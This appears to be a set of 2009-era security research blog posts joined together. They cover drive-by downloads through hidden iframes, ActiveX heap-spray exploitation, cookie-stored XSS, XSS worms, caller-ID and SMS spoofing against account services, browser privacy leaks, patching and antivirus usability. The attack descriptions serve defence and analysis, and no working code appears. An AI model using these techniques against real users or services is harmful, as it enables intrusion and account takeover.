I\'ve written before about cloud resiliency and uptime in my \'Changing a tire while going 60mph\' and \'Big, white puffy clouds can still evaporate\' posts.Amongst those outages was a Google App Engine interruption, which just goes onto the tally sheet as yet another failure of a supposed infallible cloud platform service. Ted Dziuba has some interesting viewpoints on the App Engine outage, and brings up a key element that makes all the difference with these types of outages: transparency. If something fails, people like to know why it happened (especially in light of all the resiliency/redundancy claims of the cloud) and what is being done so it doesn\'t happen again. Google\'s transparency was a basic statement that something bad happened with GFS, and that affected BigTable, which affected App Engine\'s DataStore, and they are going to fix it. Now, compare that level of detail to the information offered by Amazon during their S3 outage from July 2008 and February 2008. There is a notable difference. So a message to SaaS vendors: just because customers don\'t need to know the platform and implementation details behind your SaaS, doesn\'t mean they don\'t want to know...especially in light of a catastrophic failure. Telling customers what went wrong let\'s them enact their own post-mortem and due-diligence analysis processes to ensure they haven\'t shackled themselves to a SaaS vendor who is experiencing outages due to silly oversights that are likely to repeat as life goes on.Actually, transparency and efficient communication regarding the outage event was also a key issue for some of the other outages last week. Jeremy Irish blogged about the fire at Fisher Plaza data center that left his systems offline for 29 hours. Apparently news of what exactly was happening, even for the first responders that were physically present at the building, was scarce and little effort was made to keep folks efficiently informed. Eventually they found out that it was a fire in a basement-level electrical room, which triggered the sprinklers and in turn ruined additional electrical equipment and generators, which ultimately caused significant damage to the power infrastructure.Overall, Murphy and his laws are a fact of life and vendors (cloud, SaaS, or other) must do what is in their power to have contingency plans if you truly want to maintain availability and business continuity. And SaaS vendors, take note: just because you can hide the implementation and platform details of your service, doesn\'t mean you should hide the operational details of your service...especially during a service disruption.Until next time,- Jeff', 'Cloud', 'https://www.zscaler.com/blogs/research/cloud-transparency-during-crisis');

Microsoft fixed 31 different vulnerabilities (many affecting IE and Office), Adobe patches critical vulnerabilities in Adobe Acrobat and QuickTime, Google plugged some WebKit holes in Chrome, Apple released over 50 security fixes for Safari, and Firefox had 11 security vulnerabilities fixed, half of which were rated critical. With a lineup like this, a majority of the world is going to need to install patches to keep safe.\r\n\r\nDespite the patches being available, history has shown that people don\'t always install them. Installing patches is an inconvenience; it interrupts the use of the system and potentially requires reboots. In enterprise environments, all of this can be semi-automated with patch management and deployment systems, centralized patch repositories like WSUS, and policies that dictate the employee just sit tight while mandatory patches are applied. But for home users, computer use is often casual--which means convenience has a very strong influence. If they get on the computer to check email or surf MySpace, they are likely to not want to postpone those computing desires in order to deal with installing patches first. That\'s assuming they even know about the availability of patches in the first place.\r\n\r\nRecently some folks from Google and their partners released an analysis of web browser auto-update approaches. The analysis looked at the different effectiveness of how quickly patches gained widespread deployment due to the different patching processes they offer. For example, Chrome does \"silent updates\"--it will download patches/new versions and automatically install them without telling you. Firefox will automatically download updates, but then you have to still manually agree to the installation via a prompt given to you by Firefox. Safari tells you that an update is available, but then you have to manually agree to download and then install the update. Opera will inform you of a new version, but then you have to manually download the update yourself and proceed through the install wizard. Internet Explorer relies on Windows Automatic Update agent to download and install patches.\r\n\r\nOverall, the Google analysis found that Chrome’s silent update approach resulted in the widest spread of update deployment (97% of systems patched/updated) within a fixed period (three weeks). Firefox wound up with 85% of systems patched/updated after three weeks, and Safari and Opera wound up with some pretty low numbers. The conclusion? Badgering the user to be involved in the update process causes them to interrupt, abort, or ignore the process, leaving the patches/updates unapplied. That is non-ideal when security is involved.\r\n\r\nBut just because there are auto-update mechanisms available (Chrome, Windows), doesn\'t solve the problem per se. I\'ve encountered situations on numerous occasions where the user has disabled the automatic updating process because the software they were using was, well, \"borrowed.\" Microsoft has been struggling with this issue for years now: whether to allowed pirated copies of Windows to be eligible for service pack updates and other patches. They have slipped various anti-piracy checks into their update process under the moniker Windows Genuine Advantage, which means only legitimate copies of Windows have access to the collection of updates. But even if the software vendor doesn\'t implement technical restrictions to prevent pirated versions from updates, the user\'s conscience might still prevent it. A person who \"borrows\" a commercial software application from their friend is less likely to run to the vendor asking for support and updates, because they do not want to get their friend in trouble for handing out pirated copies; so such people are more likely to disable anything that automatically alerts the vendor to the second copy, and/or will ignore any updates (where they might be asked how they got the software in the first place) and just stick with the original (now outdated and insecure) version.\r\n\r\nOverall this whole timely security patching business is a tough problem to solve, because it\'s not simply just a matter of expecting users to download an installation file off a website and double-clicking it.\r\n\r\nUntil next time,\r\n- Jeff', 'Vulnerability', 'https://www.zscaler.com/blogs/research/patches-auto-updating-and-convenience');

How many times have you encountered web pages with a title such as “Page is loading… Please wait”? I’ve already talked about the threats posed by Phishing and ActiveX vulnerabilities in previous blogs. Another significant threat on the web is the increasingly popular drive-by download attack. In this attack, malicious software is downloaded without user knowledge by exploiting known/unknown web browser or opreating system vulnerabilities. Recently, we came across an interesting website hosting malicious animated page. The page shows animation that will entice the victim to wait patiently while content is supposedly being loaded on the page. Below is a screen capture of the page in question.               When someone visits this web page, it will continually play the ‘page is loading…’ animation and nothing will ever be displayed on the page. The victim will undoubtedly grow impatient and eventually close the page and continue surfing. But wait; did the victim notice what else was being loaded? Of course not as the malicious content was loaded in the background. Yes, the page actually contains a couple of malicious iframes,               Looking at the above code, there are two hidden malicious iframes, one is clearly shown in text format and other is obfuscated. Those hidden iframes actually point to malicious websites hosting the “LuckySploit” attack toolkit. This is another type of exploit toolkit, which takes the advantage of different types of critical vulnerabilities to download additional malware. This toolkit is more advanced than the older Mpack, Icepack, etc. toolkits. Finjan’s blog has provided detail on this new attack toolkit. After visiting the above page, the malicious website sends obfuscated JavaScript which exploits vulnerabilities, if present and downloads additional malicious binaries. The packet capture for obfuscated JavaScript is shown below,                    The attacker has done his job behind the page by downloading malicious binaries without the user noticing. These attack toolkits spread by injecting malicious hidden iframes into otherwise legitimate sites. Once the victim visits those sites, they are redirected to attacker’s website. Social engineering can also be employed to convince victims to directly visit malicious sites controlled by the attakers. The frightening part of these attacks is that the victim does not have to do anything. They simply visit the malicious page and everything runs in the background. Such malicious sites are increasing every day with advanced techniques and with the help of different novel ways to spread malware. Browser patch management is critical for those enterprises seeking to defend against such attacks.    We have observed that number of websites that are infected by hidden malicious iframes and the latest ones include attacks carried out LuckySploit and Gumblar.

Another threat for web users is the rise in the ActiveX vulnerabilities. These are very easy to exploit as there is a great deal of information available including vulnerability details, proof-of-concept exploits, etc. freely available on the Internet. ActiveX controls can be automatically downloaded and executed by Internet Explorer (with user acceptance) when viewing a web page or installed as part of a larger application. Basically, ActiveX controls have various properties and methods, which can lead to exploitation if they have not been properly coded. If someone were to find a vulnerable property or method in an ActiveX control, it is not be difficult to create a working exploit and host it on a web server. If the vulnerable control is marked ‘safe for scripting’ it can then be remotely called and exploited by a malicious web site.    Numerous buffer overflows and file overwrite vulnerabilities have been found in ActiveX controls over the past few years and working exploits are available for many of them. Using a heap spray technique, which is a popular method for reliably injecting shell code into memory, the vulnerable control can be successfully exploited by the attacker. He simply needs to host the working exploit somewhere on a web server under his control and divert a victim to visit the site. If the vulnerable ActiveX control is present on the victim’s machine, the victim will be compromised silently in the background and the vulnerability could allow remote code execution or arbitrary file overwrite. The attacker could then download and install additional malware or malicious programs.    A few months back, a vulnerability was found in Snapshot Viewer for Microsoft Access (MS08-041) that can be leveraged to download and save files to arbitrary locations on an affected system. As noted in a Symantec blog post, because this particular ActiveX control was signed by Microsoft, attackers were able to force installation/exploitation of the control without any user interaction. Web attacking toolkits like Mpack, Neospolit, etc. found in the wild are exploiting a number of such critical ActiveX vulnerabilities.    Due to the ease of exploitation with vulnerable ActiveX controls, attackers are widely using them as a popular attack vector. Heap spray code is very easy to work with and can be seen in many attacks involving ActiveX exploits. This gives the attacker the power to easily change the shellcode to whatever is required. He can then host the exploit code on the webpage and convince victims to visit the Web site, typically by getting them to click a link in an HTML e-mail link. ActiveX vulnerabilities are rising every day and people are posting exploit code on public web sites. A quick search on Securityfocus will reveal the latest ActiveX vulnerabilities as shown below:               Gone are the days when attackers were targeting server side vulnerabilities to compromise systems. Now, they are focused on targeting end users, via the web browser. A combination of heap spray and obfuscation used in the exploits makes it difficult to detect the attacks using automated means. Certainly, the rise in the use of ActiveX vulnerabilities and exploits posted on the web makes them a real threat for web security. Setting up a kill bit is the only option if the vulnerability is not patched and you do not have updated antivirus signatures. The Kill-Bit is a registry key for a particular CLSID that marks the COM object / ActiveX control referenced by that CLSID as non-loadable in the browser and other scriptable environments. Setting a Kill-Bit for the control marks that particular control as forbidden to instantiate in the browser. You can do this by modifying the data value of the Compatibility Flags DWORD value for the CLSID of the ActiveX control. Here is the link from Microsoft on how to set a kill bit for a given control:    http://support.microsoft.com/kb/240797    That’s it for now.

Yet as browser technology evolves, we are starting to have some privacy-violating \"byproducts\" of innocuous features. Now, we already generally accept that our immediate/upstream Internet providers can possibly snoop on our traffic—they can see what sites we try to access (whether by IP destination or monitoring DNS queries) and can peek into plaintext content. But the ability for an ISP to monitor traffic is limited to only the traffic that passes through it—namely, its customers. What if there were central organizations that could monitor user traffic (to a certain degree) across any/all ISPs?I\'m going to go ahead and overlook the obvious companies/services where you install a toolbar into your browser so they can watch and tabulate everywhere you go (like Alexa). That is an opt-in situation where you willingly give all your info to a third party. I\'m also going to overlook any web proxy services that you might be using, because those are also opt-in situations with the same ramifications. And of course, any internal monitoring within an organization is also exempt; I want to focus on who, outside of your local network, organization, and your ISP, is receiving your surfing data without you explicitly opting-in to give it to them.So let\'s start with HTTPS, as implemented in common web browsers. Most common browsers include certificate revocation checking capabilities for ensuring an HTTPS site certificate hasn\'t been compromised. When you access an HTTPS site, the browser will receive the server certificate and run off the to the designated CRL and OCSP servers to query whether the certificate has been revoked. Those CRL and OCSP servers are operated by the certificate issuers, such as Thawte, Verisign, etc. The key here is that many SSL certificates have a one-to-one relationship with a specific web site (i.e. traditional certificates and not wildcard certificates); so a query to an OCSP responder for a web site certificate essentially tells the certificate issuer that you are in the process of accessing that site. Now, certificate issuers can only track accesses to sites they issue certificates for—but in 2007, Verisign and subsidiaries were deemed to have issued over 57% of the SSL certificates in use, giving them the theoretical capability to track site access to over half of the HTTPS sites on the Internet.Fortunately none of the OCSP responders I briefly reviewed set HTTP browser cookies, which means they are not tracking unique individuals (at least, not through simple browser means). That is a good thing; the best tracking granularity they can achieve is generally per source IP address (ignoring browser header/request and TCP protocol fingerprinting to differentiate different browsers/systems from the same IP). This can be problematic if you\'re a home user and have a one-to-one relationship with your IP address, but tolerable if you\'re behind a NAT or proxy that serves many users (giving it a many-to-one relationship with the IP address). [Aside/favor: If you happen to see a public OCSP setting browser cookies, let me know!]Default browser start pages are another privacy leaking avenue. Every time you start your web browser, Microsoft, Apple, Opera, or Mozilla hears about it through the various default browser start page request(s):http://en-us.start2.mozilla.com/firefox?client=firefox-a&rls=org.mozilla:en-US:officialhttp://www.apple.com/startpage/http://portal.opera.comhttp://go.microsoft.com/fwlink/?LinkId=74005http://runonce.msn.com/runonce3.aspxThe start pages themselves may seem innocuous, but they can chain to more exposure. For example, Apple\'s start page includes a request to metrics.apple.com, which is really a pointer to Omniture (resolving metrics.apple.com returns a DNS CNAME to appleglobal.112.2o7.net); the request collects and sends a lot of identifying browser information including screen resolution and all installed browser plugins. I\'ve seen occasions where responses to metrics.apple.com forward to Doubleclick.net too. Now, sure, it\'s common for web pages to include metrics/analytics and advertising links—but such elements on browser start pages means these syndication/service providers also have access to realtime information of when you start your browser. In addition to Apple\'s use of Omniture and Doubleclick, Opera\'s portal page includes resource links to Google Analytics, and Mozilla redirects to Google. Microsoft\'s portal page used Webtrends.com for metrics.But more importantly, can any of these providers uniquely identify you? Microsoft relies on m.webtrends.com, and that site sets a unique cookie for you--so Webtrends has the ability to track you no matter where you go. Ditto for Apple, Omniture, and Doubleclick. The fact that these metric and advertising elements are hosted on browser start pages means the services have the opportunity to plant their unique cookie right at the beginning of your surfing session. Plus, look at where and how the start pages are hosted. Microsoft redirects from Microsoft.com to MSN.com, where the start page actually lives. By placing the start page on MSN, all of the MSN cookies are now available--and if you are logged in, that means Microsoft knows who you are and can individually identify you if they so choose. Since Mozilla redirects to Google, the same case generally applies to Google using its own cookies to identify/track you.But fortunately this is only a minor information exposure; knowing you started your web browser is not exactly an earth-shattering privacy violation, and it only occurs at the very beginning of your surfing session (not when you open a new tab, etc.). Plus, this immediate information doesn’t expose where you actually wind up surfing to...just that you opened a browser. The previously mentioned OCSP issue reveals far more information regarding where you are surfing; but it is not the only feature that does so...Many browsers have recently added various anti-phishing and safe surfing features which essentially query the host/URL you are accessing in a database to see if it\'s a known offender and thus should be blocked. Think about that for a second: for every URL/host you visit while surfing the Internet, a lookup is done to ensure the URL is safe. So how is that lookup being done?Some of the browser vendors have designed their features so that databases of the known offenders are downloaded and stored on the user\'s local system, so they can be queried locally. This is ideal, as it means the lookups are fast (just look inside the downloaded file) and it doesn\'t expose the lookups that are actually occurring. However, note that I began this paragraph with the term \"SOME of the browser vendors\"...It turns out the biggest questionable privacy offender is Opera. Their SiteCheck function, enabled by default and meant to warn you when you try to access a malware site, sends a real-time request to sitecheck2.opera.com for every new host you surf to. The transaction looks something like:GET /?host=www.google.com&hdn=naLWSHPy7ud1pACYor32hg== HTTP/1.1User-Agent: Opera/9.64 (Windows NT 5.2; U; en) Presto/2.1.1Host: sitecheck2.opera.com...HTTP/1.1 200 OKDate: Fri, 15 May 2009 15:17:11 GMTContent-Type: text/xml...<?xml version=\"1.0\" encoding=\"utf-8\"?><operatrust version=\"1.1\"><action type=\"searchresponse\"><host></host><ce>14400</ce><w>1</w></action></operatrust>That means Opera hears about every web site host you access, and can keep a historical record if they really wanted to. Now, the SiteCheck queries are not utilizing cookies to track individual users, so tracking granularity is limited to per-source-IP resolution. But it\'s still a notable privacy exposure. Other browser features like IE8\'s Suggested Sites likely expose the same level of information, but I have not confirmed it personally (but their level of privacy warnings and opt-in requirements seem to suggest so).So now that we\'ve gone through all of that, what can you do about it? Well, the good news is that you can generally turn off all of the above mentioned behaviors (you\'ll have to dig around in the Advanced Configuration areas of your browser)...but you might not want to. Sure, you can change your browser start page to something else without ramifications (actually, if you change it to a blank page, you\'ll find your browser starts faster because it doesn\'t have to initially load an external page). But OCSP checking and SiteCheck features are security protections that actually help keep you safe--so by turning that stuff off, you are opening yourself to more risk. So you need to decide what’s more important to you: your security, or your privacy.Happy deciding,- Jeff', 'Data Breach', 'https://www.zscaler.com/blogs/research/those-who-know-where-and-when-you-surf');

I\'ve noticed an increasing number of sites whereby cross-site scripting vulnerabilities exist not in echoed (reflected XSS) or database stored (persistent XSS) user supplied content, but rather within the cookie itself. This is certainly a form of persistent XSS, but not in the traditional sense as the injected script is stored on the client machine as opposed to the server and only ever exposed to a single victim.         I typically notice this on sites which display a search history. When using search functionality on a site, your past search queries are displayed and rather than storing this content on the server, perhaps in a relational database, it is instead being embedded within a cookie. Let\'s take a look at the search functionality at Sony.com.             In the image to the left, you will note that my past search queries (\'Michael\' and \'Sutton\') are displayed on the right hand side beneath the \'Your Recent Searches\' heading. Now this data has obviously come from past requests and could naturally be stored in a variety of places such as a relational database connected to the web application, within hidden form fields, embedded in the URI, etc. In this particular case however you will see that past searches are actually stored within a cookie, in this case the sonysearch_recent_searches cookie. Now there\'s certainly nothing wrong with that, after all we\'re dealing with a relatively small amount of non-critical data which doesn\'t really need to be stored beyond the current session. However, as you will also note in a later image, the user supplied content accepted in search queries isn\'t appropriately filtered and thus the site is vulnerable to a rather unique form of persistent XSS. Note: This was reported to Sony in February.         So why is this interesting? It\'s just another XSS vulnerability - not exactly an elite club to get into. I find it interesting because it has some unique characteristics. In some ways, it\'s almost a hybrid of reflected and persistent XSS. Let\'s take a look at what I mean by that.         Storage - This is certainly an example of persistent XSS, as the script is stored. However, it is stored on the client side, within a cookie, not within a relational database on the server side as is typically the case.         Victim - Unlike most persistent XSS vulnerabilities, injected script will not affect anyone that visits a vulnerable page. It will only affect a single user (like reflected XSS) as it is transmitted within a cookie when an individual request is made.         As you can see, while we have persistent XSS, it smells like reflected XSS. This could come in handy, if for example an attacker were looking to target a single individual (reflected) but wanted the attack to repeat (persistent) every time the user accessed a certain resource. Consider for example a situation where the attacker wanted to harvest sensitive data every time the victim viewed it. This situation alleviates the timing challenges associated with a successful reflected XSS attack while remaining more stealthy than typical persistent XSS.         Food for thought.         - michael', 'Abuse', 'https://www.zscaler.com/blogs/research/cookie-based-persistent-xss');

The talk turned out to be a largely incoherent, but entertaining rant and I still remember the Unix Terrorist (aka Stephen Watt) poking fun at the many cross-site scripting (XSS) holes that people had begun to publish advisories for. At the time, he was right. XSS wasn\'t a high risk vulnerability. It wasn\'t being leveraged by attackers for anything meaningful and could be easily thwarted by simply avoiding the use of JavaScript. Well...things have changed. Today, Watt faces some serious charges due to his alleged involvement in the TJX breach and XSS vulnerabilities have emerged as a legitimate threat.         What changed?         Last weekend, a web based Twitter worm (aka Mikeyy/StalkDaily worm) hit the media. It was the work of Michael Mooney, a 17 year old, self described \'bored developer\', who was brazen enough to brag about the attacks after the fact. He may be regretting the publicity at this point, now that his systems have been publicly hacked and he\'s no doubt heard about how Samy Kamkar was rewarded for his efforts after a similar attack on MySpace with a felony conviction. However, thus far it seems to have landed him a job as opposed to jail time.         What has happened to turn XSS from amusing interweb trickery into a valuable attack vector? In short, the web has changed, but unfortunately security is lagging behind. In general, I see the following four factors that deserve credit:         1.) Prevention [should be] the best Medicine - We\'ve known about the dangers of XSS for at least a decade now, and yet it remains the most prevalent web application vulnerability out there. Efforts to educate developers has produced limited results, not in my opinion because developers don\'t care, but because the population of web developers is growing at a tremendous pace, thanks to point \'n click development environments. We\'ve empowered millions with the tools to develop web applications but we\'ve also made it far to easy to produce an insecure application.         2.) The Ubiquity of JavaScript - We used to tell users to avoid XSS by avoiding JavaScript. That was a reasonable statement in 2001 but good luck surfing the web today without a JavaScript enabled browser. You\'d be better off using a text based browser such as lynx. With the advent of AJAX enabled sites and the demand for increasingly interactive, user-friendly web content, you\'d be hard pressed to find a JavaScript free site that is actually used by anyone.         3.) The Power of Social Networking - Web based worms such as the Twitter worm have one inherent limitation - they live within the ecosystem where they were created. While this would be significant for a seldom used web application, with social networking sites measuring active users in the hundreds of millions this is hardly a limitation at all.         4.) Sky\'s the limit - While we tend to think of XSS as a way to steal session credentials, such attacks are limited only be the creativity of the researchers/attackers that pursue them. Anton Rager developed XSS-Proxy as a means to remotely control XSS attacks. Billy Hoffman turned a browser into a vulnerability scanner via XSS. Jeremiah Grossman demonstrated gaining insight into someone\'s browser history and at Black Hat DC this year, I talked about how XSS can be used to conduct client-side SQL injection. The list goes on and on...         The Twitter and MySpace worms were largely benign. When traditional worms began spreading, they were largely benign as well, a proof of concept to prove that something could be done. Once that hurdle had been overcome, criminals moved in to profit and I don\'t expect the outcome to be any different this time around either.         We\'ve set the bar far too low for attackers. Well known vulnerabilities such as XSS remain far too prevalent, despite having been around for years. It\'s encouraging to see Microsoft stepping into the fray by adding XSS prevention to Internet Explorer 8 and I hope that other browser vendors will do the same.

The law does NOT recognize the concept of \"ethical\" hacking. As such, the true key to ethical hacking is the confidence that the person you are hacking is not going to legally pursue you after your activities. Hack only when you have permission to do so. Without permission, you are putting yourself legally on the hook regardless of your morals and non-malicious intentions.If you are still steadfast in your desire to perform security tests without explicit permission in a manner that you feel is morally clean, then you need to ensure that you keep all your actions above board and follow through on your non-malicious intentions.

Taking the time, for example, to dump the entire user database along with passwords and play around with it for a few weeks before you finally disclose the problem is not going to be seen as aligned with clean intentions.

Maybe this made sense in the 90\'s when spoofing caller-ID was hard, and the most it would offer is accessing someone\'s voicemail without a PIN. But nowadays there are countless online services that allow SMS and caller-ID source spoofing (Spoofcard, Phonytext, etc). Pair this with the growing number of services offering telephony or SMS integration, and you start to have a problem.\r\n\r\nLet\'s review some recent examples of this situation in action. Twitter was found to allow spoofed SMS messages to perform Twitter account actions/changes. The core problem was first identified nearly two years ago, but a recent variant allowed attackers to circumvent previously added safeguards. Twitter offers the option of using a PIN, but using a PIN impacts the ease of use and the overall user experience--so users do not jump at the opportunity to opt-in to this additional hurdle.\r\n\r\nGoogle Voice has also had a fair amount of problems exposed, although some of the problems use different vulnerability vectors than the simple spoofed caller-ID/SMS. Spoofing caller-ID of a mobile phone configured for a Google Voice account allows an attacker to get into the Google Voice IVR system for that account and modify certain settings. Google has since closed these holes.\r\n\r\nWhile we are talking about hacking telephone/SMS-related services, it is probably worth mentioning an XSS bug found on Skype\'s website. The attacker can try the usual bag of tricks to get a user to click on an XSS-ified link and gain access to the Skype session cookie. Fortunately, it seems Skype session cookies expire after thirty minutes...making the window of exploit opportunity it bit more difficult for an attacker to hit.\r\n\r\nOverall, it is important for companies looking to add SMS/telephony bridged capabilities to their existing services to understand that caller-ID and SMS source information is not reliable for authentication purposes. Period. It is no different than asking a user for their username without the additional authentication aspect of a password; it creates an \"on your honor\" system which is ripe for abuse.\r\n\r\nUntil next time,\r\n- Jeff', 'Abuse', 'https://www.zscaler.com/blogs/research/spoofing-caller-id-new-hacking-inroad');

It has a few more bells and whistles but of particular interest is the addition of offline access. Gmail went offline a few months ago thanks to Gears (formerly Google Gears). Mobile Safari on the iPhone doesn\'t however have a Gears plugin, so how was this accomplished? The answer lies in the yet to be finalized HTML 5 specification and specifically the client-side database storage functionality that it calls for. While HTML 5 remains a work in progress, WebKit based browsers, such as Safari and Mobile Safari have already adopted database storage. This permits developers to create and subsequently read from/write to a fully capable, locally stored, relational database which is accessed via the web browser. I view today\'s Gmail release as a watershed moment for offline web applications as this is the first mainstream web application that I\'ve seen using the technology.    I view offline access as an inevitable next step for web applications. We have continued to blur the line between desktop applications and their web based counterparts. Technologies such as AJAX, Flash, Silverlight, etc. have continued to push the limits on what browser based applications are capable of but despite all of the added functionality, web apps suffer from one inherent limitation - they disappear when you go off the grid. Well, that\'s about to change.    Local Gmail Storage    Since the iPhone (un-jailbroken) doesn\'t permit raw file access, I\'ll walk through Gmail\'s use of HTML 5 via Safari on a standard OS X platform. First off, in order to get Google to deliver the HTML 5 version of Gmail, we\'ll change the User-Agent header to match that used by the iPhone as follows:    Mozilla/5.0 (iPhone; U; CPU iPhone OS 2_2_1 like Mac OS X; en-us) AppleWebKit/525.18.1 (KHTML, like Gecko) Version/3.1.1 Mobile/5H11 Safari/525.20    Now when we visit Gmail, the iPhone version of the app is displayed. At this point, local database storage has automagically been setup. One concern that I have here is that the end user is not informed of this. Gears will at least require the end user to acknowledge that a local copy of data is being set up. While I\'m not a fan of leaving security decisions in the hands of the average end user, I do feel that users should be informed that they\'re now carrying around a local copy of their email, which could be accessible if their phone were ever lost.    Now let\'s see exactly what has been stored locally. On OS X, the database is set up in the following location:    /Users/[username]/Library/Safari/Databases/http_mail.google.com_0/000000000000000x.db    Separate databases will be established for each separate Gmail account accessed, with each receiving an incremented numerical value. The database leverages the SQLite format. As such, database content can be viewed with an application such as the SQLite Database Browser. Below are details the tables that are created, along with a description of the data contained within:           	action_queue - Purpose unclear  	cached_contacts - Top 20 contacts, including email addresses and names  	cached_conversation_headers - Abbreviated content from email messages including the full subject, sender\'s name and first sentence or two of the message  	cached_labels - User defined labels which can be assigned to email messages  	cached_messages - Similar to cached_conversation_headers  	cached_queries - Purpose unclear  	config_table - Application version number  	hit_to_data - Purpose unclear  	log_store - Purpose unclear      Security Concerns    I\'ve commented in the past that Gears and HTML 5 represent fantastic technologies but as with most new technologies, when poorly implemented, they can lead to increased security risk. Applications communicate with local data storage via JavaScript calls. The calls are restricted by a same origin policy to ensure that only the application which created the data, can then subsequently access it. However, as I demonstrated at Black Hat DC this year, when sites are affected by XSS vulnerabilities, a remote attacker could gain access to local database storage and perform client-side SQL injection attacks. Now fortunately, I have no reason to believe that Gmail is currently suffering from any XSS vulnerabilities, but they certainly have numerous times in the past. What I\'m more concerned about is the fact that XSS remains an all too common vulnerability and as other developers adopt local database storage either via Gears or HTML 5, we are sure to see plenty of vulnerable sites, which will place end users at risk. This isn\'t just a privacy concern, it\'s also a data integrity issue as an attacker can write to the database just as easily as they can read from it.    Overall, I feel that the HTML 5 specification has a great deal to offer and it\'s encouraging to see some early adoption. It will be up to developers to ensure that powerful features such as local database storage do not unnecessarily expose end users to increased risk.    - michael', 'Apple', 'https://www.zscaler.com/blogs/research/gmail-and-html-5');

Even leaving the performance issues out of it, I find it very frustrating to configure and use. I get that it\'s complicated behind the scenes, but how many knobs do you really need to say that you\'d like your computer protected from lurking evil? As a security geek, I\'d like a few more knobs than most people, and a little more explanation, but somehow what I want isn\'t available and what I don\'t want is slathered all over my screen in popups and screen after screen of nigh-useless configuration options. Here\'s my take on what antivirus software does:         	Detect viruses (and spyware or whatever else)  	Respond to viruses  	Update detection functionality        That\'s it. Anything else is just variations on a theme, or possibly a smoke screen of some sort.    Detect viruses    Though you wouldn\'t know it to look at any AV I\'ve tried, this should be simple to configure. There are only 3 questions:           	When to look? E.g. continuously [starting in 10 minutes], once right now, regularly in the future  	Where to look? E.g. in memory, on disk, in traffic coming from outside (email, removable media, downloads)  	What to look for? E.g. viruses, spyware, tracking cookies, root kits        For some reason AV vendors seem to scatter these questions over multiple screens with no rhyme or reason (at least from the user\'s point of view) . In the AV I\'m running on one of my machines, where to look is configured differently depending on when to look, so if you scan continuously, you can white-list a directory, but if you scan regularly, no white-list applies. Of course it\'s not all organized by when to look; there\'s one section organized purely by where to look, located in parallel to the when to look sections.    Respond to viruses    Sooner or later, your software will find a virus. If you want your users to think, \"wow! good thing I\'m protected\" rather than \"yecch! I must run straight to my blog and post about how awful AV software is\", help your users respond to the situation constructively. Here are their likely questions:    What\'s going on?    Hopefully, your users are reasonably cautious and therefore don\'t see your \"I found a virus\" dialog regularly. Certainly last week was the first time I\'ve seen this dialog in the course of my regular-user computing (I\'ve seen it plenty when it involves my valiant attempts to protect my malware cache). Most such dialogs try to answer this question with a link to more information, which seems like a fine idea to me.    Ladies and gentlemen, such a link had better work. At the moment your user sees this link, he has been startled out of his task to respond to what he is likely to see as an emergency. He is likely to have a negative emotional response to being startled, the delay in his work, the nature of the emergency (a virus? ewww), et cetera. Even if your target user won\'t understand anything technical you might have to say about the virus, this is the moment you need to convince your wary and probably already irritated user that there is something bad going on, but you, the AV vendor, know all about it. In my case, it took me to a generic search page on my vendor\'s web site (don\'t do this), which claimed it didn\'t know of such a virus when I used the exact name shown on the dialog (good grief, people). When I tried again with a substring of the name given in the dialog,  it found an entry with the exact same title it claimed it couldn\'t find only seconds previously (don\'t do this). This essentially blank entry contained no information whatsoever about when the virus was discovered, its typical effects, how it spreads, related viruses, how to get rid of an infection, or anything else I (or a normal user) might want to know. In short, information in this entry was thin enough that even non-security folks would be wondering whether this was real. Which brings us to the next question.    Are you sure?    It\'s possible that if your users are not security geeks, and you handled the previous question well enough, you wouldn\'t need to face this question. Perhaps some kind of certainty meter would be enough in some cases (but keep it hooked up to something real, please).    My first instinct was to hand a copy of this supposed virus off to our in-house equivalent of Virus Total for a second (and following) opinion. Unfortunately, the AV was now making the files in question very difficult to access (it\'s supposed to, after all), and after an hour or so, I decided it didn\'t matter if it were a false positive, because there was no way I was going to be able to use or copy the files anyway, unless I switched AV (which was tempting at that point). As an AV vendor, if you are confident in your diagnosis, I suggest you provide a button to consult Virus Total or similar. I\'d certainly trust you more, and your less-informed users probably would too.    What can I do about it?    Users are hoping for options like \"remove\", \"repair damage\" or possibly \"quarantine\". If you present options that will not work (e.g. for consistency so the same options always show up), grey them out and provide some kind of indicator why they won\'t work, hopefully including a way to make it work. In my case, both remove and the equivalent of \"remove as superuser\" landed me in an endless loop of dialog boxes involving UAC and the AV software (but not, interestingly, ever actually attempting to become Administrator as one would expect). The equivalent of \"quarantine\" also failed. In the end, I had to empty the quarantine area of an old copy of my previously quarantined-against-my-will malware stash, from before I moved it to a machine with a decent OS, quarantine, and then empty quarantine again. This solution required a fair amount of hunting around and more information about how AV usually works than was readily apparent from the dialogs. I don\'t think most AV users would be able to do it, e.g. an acquaintance whose AV (a different brand) kept alerting about viruses but wouldn\'t let her get rid of them, who ended up having to send her machine in for service last month.    Another option I\'d like to see is \"submit for re-analysis\" or similar. Users could do this if they think it is a false positive. With an automated service to see the results from files that have already been re-analyzed, this could add an option like \"ignore\" to the available options (better put the file on a white list so you don\'t bother the user again, though).    Update detection functionality    Trust me, the user does not want to hear about this in real-time. By all means, log plenty and request assistance from the user if something you can\'t fix automatically goes wrong with your attempt. I used to use some AV that assured me it was updating successfully even though my network was quiescent and the only file changed on disk was the log file -- quiet failure of protective equipment is never desirable. But as soon as it\'s going right again, shut up and go away! Do not make your innocent user click through dialog after dialog if she happens to disconnect from the net for a week.    When to look, and maybe where to look if there are choices, is the only thing you need to configure. Snag information about proxy settings and the like from the OS; don\'t make us configure them again.    Yes, there are some other aspects of operation some of us might want to control. But chances are good that from the user\'s perspective, most of them are about one of the above functions, so do your users a favor and make them accessible from the same place as the related settings. Your users\' lives would be better if they could configure your software to do what they want, and organizing settings in a way that makes sense to the user is a good starting point.    --Brenda', 'AntiVirus', 'https://www.zscaler.com/blogs/research/antivirus-cant-live-it-cant-live-without-it');

